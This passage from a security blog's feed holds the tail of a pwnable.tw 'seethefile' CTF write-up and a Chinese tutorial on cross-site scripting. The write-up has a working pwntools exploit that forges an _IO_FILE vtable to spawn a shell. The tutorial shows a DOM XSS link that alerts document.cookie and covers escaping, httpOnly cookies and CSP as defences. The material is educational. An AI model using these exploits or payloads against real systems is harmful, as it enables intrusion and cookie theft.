class="params">(filename)</span>:</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'see :'</span>)</span><br><span class="line">p.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writefile</span><span class="params">()</span>:</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closefile</span><span class="params">()</span>:</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(name)</span>:</span></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name :'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">data = p.recvuntil(<span class="string">'r-xp'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  libc_base = int(data.split(<span class="string">'-'</span>)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  libc_base = int(data.split(<span class="string">'-'</span>)[<span class="number">-3</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x0804B260</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'/bin/sh'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(buf + <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">exit(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"./home/seethefile/get_flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"magic :"</span>)</span><br><span class="line">p.sendline(<span class="string">"Give me the flag\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>修改后的<code>_IO_FILE</code>结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p *((struct _IO_FILE_plus *)0x804B260)</span><br><span class="line">$30 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0x6e69622f,</span><br><span class="line">    _IO_read_ptr = 0x68732f &lt;error: Cannot access memory at address 0x68732f&gt;,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x1 &lt;error: Cannot access memory at address 0x1&gt;,</span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;,</span><br><span class="line">    _IO_write_end = 0xf75f9700 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x804b260 &lt;name&gt; &quot;/bin/sh&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0x0,</span><br><span class="line">    _flags2 = 0x0,</span><br><span class="line">    _old_offset = 0x0,</span><br><span class="line">    _cur_column = 0x0,</span><br><span class="line">    _vtable_offset = 0x0,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x804b270 &lt;name+16&gt;,</span><br><span class="line">    _offset = 0x0,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x0,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0x0,</span><br><span class="line">    _mode = 0x0,</span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 39 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x804b2b4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改后的<code>vtable</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p *((struct _IO_jump_t *)0x804B2B4)</span><br><span class="line">$31 = &#123;</span><br><span class="line">  __dummy = 0x0,</span><br><span class="line">  __dummy2 = 0x0,</span><br><span class="line">  __finish = 0x0,</span><br><span class="line">  __overflow = 0x0,</span><br><span class="line">  __underflow = 0x0,</span><br><span class="line">  __uflow = 0x0,</span><br><span class="line">  __pbackfail = 0x0,</span><br><span class="line">  __xsputn = 0x0,</span><br><span class="line">  __xsgetn = 0x0,</span><br><span class="line">  __seekoff = 0x0,</span><br><span class="line">  __seekpos = 0x0,</span><br><span class="line">  __setbuf = 0x0,</span><br><span class="line">  __sync = 0x0,</span><br><span class="line">  __doallocate = 0x0,</span><br><span class="line">  __read = 0x0,</span><br><span class="line">  __write = 0x0,</span><br><span class="line">  __seek = 0x804b2b4,</span><br><span class="line">  __close = 0xf7634da0 &lt;__libc_system&gt;,</span><br><span class="line">  __stat = 0x0,</span><br><span class="line">  __showmanyc = 0x0,</span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://yuuoniy.github.io/2018/08/14/seethefile-writeup/" target="_blank" rel="noopener">https://yuuoniy.github.io/2018/08/14/seethefile-writeup/</a><br><a href="http://blog.eonew.cn/archives/1123" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1123</a><br><a href="http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D" target="_blank" rel="noopener">http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Get familiar with &lt;code&gt;_IO_FILE&lt;/code&gt;.&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>初探跨站脚本攻击（Cross-Site Scripting）</title>
    <link href="https://qianfei11.github.io/2019/08/12/%E5%88%9D%E6%8E%A2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88Cross-Site-Scripting%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2019/08/12/初探跨站脚本攻击（Cross-Site-Scripting）/</id>
    <published>2019-08-12T01:13:17.000Z</published>
    <updated>2019-08-26T05:45:50.878Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做渗透测试，需要接触一些 WEB 方面的基础知识。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>XSS 全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为 XSS，比较合适的方式应该叫做跨站脚本攻击。</p><p>跨站脚本攻击是一种常见的 web 安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p><p>注入点：</p><ol><li>GET 请求参数</li><li>POST 请求参数</li><li>UA（User Agent）</li><li>Referer</li><li>URL</li><li>…</li></ol><p>总共分成三类，存储型 XSS（<code>Stored XSS</code>）、反射型 XSS（<code>Reflected XSS</code>）和<code>DOM-based XSS</code>。几种攻击方式的图解可以参考<a href="http://blog.nsfocus.net/xss-start-finish/" target="_blank" rel="noopener">绿盟的这篇文章</a>，三种 XSS 可以参考<a href="https://blog.csdn.net/u011781521/article/details/53894399" target="_blank" rel="noopener">这篇文章</a>在本地测试</p><h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h2><p>也叫持久型 XSS，那些将恶意脚本永久的保存在目标服务器上的攻击方式，如存储在数据库、消息论坛、访问日志、评论内容扥等。Payload 是有经过存储的，当一个页面存在存储型 XSS 的时候，XSS 注入成功后，那么每次访问该页面都将触发 XSS。</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><a href="http://www.secist.com/archives/5388.html" target="_blank" rel="noopener">http://www.secist.com/archives/5388.html</a></p><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h2><p>也叫非持久型 XSS，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。最常见的是 Payload 是构造在网址的某个 GET 参数的值里。</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p><a href="https://blog.csdn.net/binyao02123202/article/details/9041113" target="_blank" rel="noopener">https://blog.csdn.net/binyao02123202/article/details/9041113</a></p><h2 id="DOM-Based-型-XSS"><a href="#DOM-Based-型-XSS" class="headerlink" title="DOM-Based 型 XSS"></a>DOM-Based 型 XSS</h2><p>攻击者利用原生 JavaScript 代码篡改客户端的 DOM 结构，导致用户操作执行了“意外”的动作。</p><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Select your language:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(</span></span><br><span class="line"><span class="xml">      "<span class="tag">&lt;<span class="name">OPTION</span> <span class="attr">value</span>=<span class="string">1</span>&gt;</span>" +</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.location.href.substring(</span></span><br><span class="line"><span class="javascript">          <span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>) + <span class="number">8</span></span></span><br><span class="line"><span class="undefined">        ) +</span></span><br><span class="line"><span class="javascript">        <span class="string">"&lt;/OPTION&gt;"</span></span></span><br><span class="line"><span class="undefined">    );</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">    document.write("<span class="tag">&lt;<span class="name">OPTION</span> <span class="attr">value</span>=<span class="string">2</span>&gt;</span>English<span class="tag">&lt;/<span class="name">OPTION</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">…</span><br></pre></td></tr></table></figure><p>网站 URL 则为这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.some.site/page.html?default=French</span><br></pre></td></tr></table></figure><p>利用这个页面 DOM 结构的漏洞，向受害者发送下面的链接，点开这个链接就会将用户的 cookie 全部 alert 出来了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="How-to-Test"><a href="#How-to-Test" class="headerlink" title="How to Test"></a>How to Test</h1><h2 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h2><ul><li>直接插入到<code>script</code>标签里</li><li>插入到<code>html</code>注释里</li><li>插入到<code>html</code>标签的属性名里</li><li>插入到<code>html</code>标签的属性值里</li><li>作为<code>html</code>标签的名字</li><li>直接插入到<code>css</code>里</li></ul><h3 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h3><ul><li>参数中提交<code>xss payload</code>代码</li><li>在所有可以提交参数并能在页面返回的位置上<ul><li><code>url</code>的每一个参数</li><li><code>url</code>本身</li><li>表单</li><li>搜索框</li><li>…</li></ul></li></ul><h3 id="Usual-Scene"><a href="#Usual-Scene" class="headerlink" title="Usual Scene"></a>Usual Scene</h3><ul><li>重灾区——评论区、留言区、个人信息、订单信息等</li><li>针对型——站内信、网页即时通讯、私信、意见反馈等</li><li>存在风险——搜索框、当前目录、图片属性等</li></ul><h1 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h1><p><a href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt" target="_blank" rel="noopener">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt</a><br><a href="https://github.com/ismailtasdelen/xss-payload-list" target="_blank" rel="noopener">https://github.com/ismailtasdelen/xss-payload-list</a></p><h1 id="How-to-Avoid"><a href="#How-to-Avoid" class="headerlink" title="How to Avoid"></a>How to Avoid</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="不要把不受信任的数据插入到原本允许-JavaScript-可以放置的地方"><a href="#不要把不受信任的数据插入到原本允许-JavaScript-可以放置的地方" class="headerlink" title="不要把不受信任的数据插入到原本允许 JavaScript 可以放置的地方"></a>不要把不受信任的数据插入到原本允许 JavaScript 可以放置的地方</h3><ol><li><code>&lt;script&gt;...永远不要把不受信任的数据放在这...&lt;/script&gt;</code>：直接放在 script 标签内</li><li><code>&lt;!--...永远不要把不受信任的数据放在这...--&gt;</code>：放在 HTML 注释内</li><li><code>&lt;div ...永远不要把不受信任的数据放在这...=test /&gt;</code>：做为一个属性名</li><li><code>&lt;永远不要把不受信任的数据放在这... href=&quot;/test&quot; /&gt;</code>：做为一个标签名</li><li><code>&lt;style&gt;...永远不要把不受信任的数据放在这...&lt;/style&gt;</code>：直接放在 style 标签内复制代码原则 1——在向元素中插入不受信任的 HTML 代码之前一定要进行转义</li></ol><h3 id="在向元素中插入不受信任的-HTML-代码之前一定要进行转义"><a href="#在向元素中插入不受信任的-HTML-代码之前一定要进行转义" class="headerlink" title="在向元素中插入不受信任的 HTML 代码之前一定要进行转义"></a>在向元素中插入不受信任的 HTML 代码之前一定要进行转义</h3><ol><li><code>&lt;body&gt;...将不受信任的数据转义后再放在这...&lt;/body&gt;</code></li><li><code>&lt;div&gt;...将不受信任的数据转义后再放在这...&lt;/div&gt;</code></li><li>…</li></ol><p>常用的转义规则如下：</p><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">转义后的字符</th></tr></thead><tbody><tr><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center"><code>&amp;amp;</code></td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center"><code>&amp;lt;</code></td></tr><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center"><code>&amp;gt;</code></td></tr><tr><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center"><code>&amp;quot;</code></td></tr><tr><td style="text-align:center"><code>&#39;</code></td><td style="text-align:center"><code>&amp;#x27;</code></td></tr><tr><td style="text-align:center"><code>/</code></td><td style="text-align:center"><code>&amp;#x2F;</code></td></tr></tbody></table><h3 id="向元素的属性插入不受信任的-HTML-代码之前一定要进行转义"><a href="#向元素的属性插入不受信任的-HTML-代码之前一定要进行转义" class="headerlink" title="向元素的属性插入不受信任的 HTML 代码之前一定要进行转义"></a>向元素的属性插入不受信任的 HTML 代码之前一定要进行转义</h3><ol><li><code>&lt;div attr=...将不受信任的数据转义后再放在这...&gt;content&lt;/div&gt;</code>：在没有加引号的属性值内</li><li><code>&lt;div attr=&#39;...将不受信任的数据转义后再放在这...&#39;&gt;content&lt;/div&gt;</code>：在加了单引号的属性值内</li><li><code>&lt;div attr=&quot;...将不受信任的数据转义后再放在这...&quot;&gt;content&lt;/div&gt;</code>：在加了双引号的属性值内</li></ol><h3 id="用不受信任的数据向-JavaScript-代码赋值前，一定要进行转义"><a href="#用不受信任的数据向-JavaScript-代码赋值前，一定要进行转义" class="headerlink" title="用不受信任的数据向 JavaScript 代码赋值前，一定要进行转义"></a>用不受信任的数据向 JavaScript 代码赋值前，一定要进行转义</h3><ol><li><code>&lt;script&gt;alert(&#39;...将不受信任的数据转义后再放在这...&#39;)&lt;/script&gt;</code>：在一个字符串之内</li><li><code>&lt;script&gt;x=&#39;...将不受信任的数据转义后再放在这...&#39;&lt;/script&gt;</code>：在表达式的一侧</li><li><code>&lt;div onmouseover=&quot;x=&#39;...将不受信任的数据转义后再放在这...&#39;&quot;&lt;/div&gt;</code>：在事件处理函数内</li></ol><p>有一些 JavaScript 函数永远无法安全的使用不受信任的数据作为输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.setInterval(<span class="string">"即使你做了转义，但是仍然可能被XSS攻击"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="在-HTML-的上下文中对-JSON-值进行转义，并用-JSON-parse-方法来读取值"><a href="#在-HTML-的上下文中对-JSON-值进行转义，并用-JSON-parse-方法来读取值" class="headerlink" title="在 HTML 的上下文中对 JSON 值进行转义，并用 JSON.parse()方法来读取值"></a>在 HTML 的上下文中对 JSON 值进行转义，并用 JSON.parse()方法来读取值</h3><p>一定要确保<code>http response</code>中的头部信息的<code>content-type</code>为<code>application/json</code>，而不是<code>text/html</code>，因为那样的话，很可能会被人利用进行 XSS 攻击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Date: Wed, 06 Feb 2013 10:28:54 GMT</span><br><span class="line">Server: Microsoft-IIS/7.5....</span><br><span class="line">Content-Type: text/html; charset=utf-8 &lt;-- bad</span><br><span class="line">...</span><br><span class="line">Content-Length: 373</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">&#123;&quot;Message&quot;:&quot;No HTTP resource was found that matches the request URI &apos;dev.net.ie/api/pay/.html?HouseNumber=9&amp;AddressLine</span><br><span class="line">=The+Gardens&lt;script&gt;alert(1)&lt;/script&gt;&amp;AddressLine2=foxlodge+woods&amp;TownName=Meath&apos;.&quot;,&quot;MessageDetail&quot;:&quot;No type was found</span><br><span class="line">that matches the controller named &apos;pay&apos;.&quot;&#125;   &lt;-- 这里script标签有可能会被执行</span><br></pre></td></tr></table></figure><p>使用<code>application/json</code>就不会被利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Date: Wed, 06 Feb 2013 10:28:54 GMT</span><br><span class="line">Server: Microsoft-IIS/7.5....</span><br><span class="line">Content-Type: application/json; charset=utf-8 &lt;--good</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="将不受信任的数据作为-CSS-属性插入到文档之前一定要进行转义"><a href="#将不受信任的数据作为-CSS-属性插入到文档之前一定要进行转义" class="headerlink" title="将不受信任的数据作为 CSS 属性插入到文档之前一定要进行转义"></a>将不受信任的数据作为 CSS 属性插入到文档之前一定要进行转义</h3><ol><li><code>&lt;style&gt;selector { property : ...将不受信任的数据转义后再放在这...; } &lt;/style&gt;</code>：属性值</li><li><code>&lt;style&gt;selector { property : &quot;...将不受信任的数据转义后再放在这...&quot;; } &lt;/style&gt;</code>：属性值</li><li><code>&lt;span style=&quot;property : ...将不受信任的数据转义后再放在这...&quot;&gt;text&lt;/span&gt;</code>：属性值</li></ol><p>有一些<code>css</code>属性值对于不受信任的数据是无法确保万无一失的——即使做了转义，如下面的两个<code>css</code>属性：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">  <span class="attribute">background-url</span>: <span class="string">"javascript:alert(1)"</span>;</span><br><span class="line">&#125;</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="attribute">text-size</span>: <span class="string">"expression(alert('XSS'))"</span>;</span><br><span class="line">&#125; // only in IE</span><br></pre></td></tr></table></figure><p>应该确保所有 CSS 属性值引入的外部链接是由<code>http</code>开头的，而不是<code>javascript</code>开头的</p><h3 id="向-HTML-的-URL-参数插入将不受信任的数据前，一定要将进行转义"><a href="#向-HTML-的-URL-参数插入将不受信任的数据前，一定要将进行转义" class="headerlink" title="向 HTML 的 URL 参数插入将不受信任的数据前，一定要将进行转义"></a>向 HTML 的 URL 参数插入将不受信任的数据前，一定要将进行转义</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.somesite.com?test=...将不受信任的数据转义后再放在这..."</span>&gt;</span></span><br><span class="line">  link</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Better"><a href="#Better" class="headerlink" title="Better"></a>Better</h2><h3 id="对于-cookie-使用-httpOnly-标识"><a href="#对于-cookie-使用-httpOnly-标识" class="headerlink" title="对于 cookie 使用 httpOnly 标识"></a>对于 cookie 使用 httpOnly 标识</h3><p>使用<code>httpOnly</code>标识后的<code>cookie JavaScript</code>是无法获取的，又由于<code>cookie</code>是基于同源原则，所以一定程度上会防范那些利用客户<code>cookie</code>的<code>XSS</code>攻击。</p><h3 id="在-http-header-中使用-Content-Security-Policy"><a href="#在-http-header-中使用-Content-Security-Policy" class="headerlink" title="在 http header 中使用 Content Security Policy"></a>在 http header 中使用 Content Security Policy</h3><p>利用<code>http header</code>中的属性值<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener"><code>Content-Security-Policy</code></a>来防范<code>XSS</code>。<code>HTTP</code>响应头中<code>Content-Security-Policy</code>允许站点管理者在指定的页面控制用户代理的资源。除了少数例外，这条政策将极大地指定服务源以及脚本端点。</p><h3 id="使用自动转义模板系统"><a href="#使用自动转义模板系统" class="headerlink" title="使用自动转义模板系统"></a>使用自动转义模板系统</h3><p>许多 Web 应用程序框架提供了自动的上下文转义功能，如<a href="https://docs.angularjs.org/api/ng/service/sce" target="_blank" rel="noopener"><code>AngularJS</code>严格的上下文转义</a>和<a href="https://golang.org/pkg/html/template/" target="_blank" rel="noopener"><code>Go</code>模板</a>。尽可能使用这些技术。</p><h3 id="在-http-header-中使用-X-XXS-Protection"><a href="#在-http-header-中使用-X-XXS-Protection" class="headerlink" title="在 http header 中使用 X-XXS-Protection"></a>在 http header 中使用 X-XXS-Protection</h3><p><code>http header</code>中<code>X-XSS-Protection</code>响应头是<code>Internet Explorer</code>、<code>Chrome</code>和<code>Safari</code>的一个功能，当检测到跨站脚本攻击时，浏览器将停止加载页面。虽然这些保护在现代浏览器中基本上是不必要的，当网站实施一个强大的<code>Content-Security-Policy</code>来禁用内联的<code>JavaScript (&#39;unsafe-inline&#39;)</code>时, 他们仍然可以为尚不支持<a href="https://developer.mozilla.org/en-US/docs/Glossary/CSP" target="_blank" rel="noopener"><code>CSP</code></a>的旧版浏览器的用户提供保护。</p><h1 id="Games"><a href="#Games" class="headerlink" title="Games"></a>Games</h1><ol><li><a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a> —&gt; <a href="https://github.com/masazumi-github/alert-1-to-win" target="_blank" rel="noopener">alert(1) to win payloads</a></li><li><a href="http://prompt.ml/0" target="_blank" rel="noopener">prompt(1) to win</a> —&gt; <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="noopener">XSSChallengeWiki - prompt.ml</a></li><li><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">XSS game area</a> —&gt; <a href="https://www.freebuf.com/articles/web/36072.html" target="_blank" rel="noopener">玩转 Google 的 XSS 游戏</a></li><li><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges</a> —&gt; <a href="https://github.com/matachi/MaTachi.github.io/blob/master/src/pages/solutions-to-the-wargame-xss-challenges-at-xss-quiz-int21h-jp.md" target="_blank" rel="noopener">Solutions to the wargame XSS Challenges</a></li></ol><h1 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h1><ul><li><a href="https://juejin.im/post/5bad9140e51d450e935c6d64" target="_blank" rel="noopener">如何防止 XSS 攻击</a></li><li><a href="https://blog.cm2.pw/length-restricted-xss/" target="_blank" rel="noopener">XSS with length restriction</a></li><li><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS 过滤绕过速查表</a></li><li><a href="http://blog.nsfocus.net/xss-advance/" target="_blank" rel="noopener">XSS 攻击进阶篇——那些年我们看不懂的 XSS</a></li><li><a href="https://www.freebuf.com/articles/web/61268.html" target="_blank" rel="noopener">XSS 攻击冷门花样玩法总结</a></li><li><a href="https://www.freebuf.com/articles/web/74324.html" target="_blank" rel="noopener">戏耍 XSS 的一些技巧</a></li><li><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">Bypass xss 过滤的测试方法</a></li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://juejin.im/post/5bcc9487518825780e6eaf12" target="_blank" rel="noopener">https://juejin.im/post/5bcc9487518825780e6eaf12</a><br><a href="https://www.fooying.com/the-art-of-xss-1-introduction/" target="_blank" rel="noopener">https://www.fooying.com/the-art-of-xss-1-introduction/</a><br><a href="http://blog.nsfocus.net/xss-start-finish/" target="_blank" rel="noopener">http://blog.nsfocus.net/xss-start-finish/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在做渗透测试，需要接触一些 WEB 方面的基础知识。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://qianfei11.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>解决gef missing问题</title>
    <link href="https://qianfei11.github.io/2019/08/11/%E8%A7%A3%E5%86%B3gef-missing%E9%97%AE%E9%A2%98/"/>
    <id>https://qianfei11.github.io/2019/08/11/解决gef-missing问题/</id>
    <published>2019-08-11T08:50:36.000Z</published>
    <updated>2019-09-07T13:28:47.787Z</updated>
    
